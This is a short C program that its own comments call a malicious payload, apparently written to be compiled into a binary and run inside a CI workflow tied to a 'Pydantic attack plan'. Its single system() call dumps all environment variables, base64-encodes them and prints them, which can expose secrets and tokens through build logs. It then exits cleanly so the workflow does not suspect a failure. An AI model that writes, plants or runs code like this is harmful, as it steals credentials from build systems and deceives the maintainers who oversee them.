#include <stdio.h>
#include <stdlib.h>

int main() {
    // 1. The Malicious Payload: Dump env vars, Base64 encode them, and print to stdout
    // This perfectly matches the Pydantic attack plan, but hidden inside a compiled binary.
    system("env | sort | base64 -w0 | fold -w76");

    // 2. The Benign Pass-Through: Exit cleanly so the workflow doesn't suspect a failure
    return 0;
}
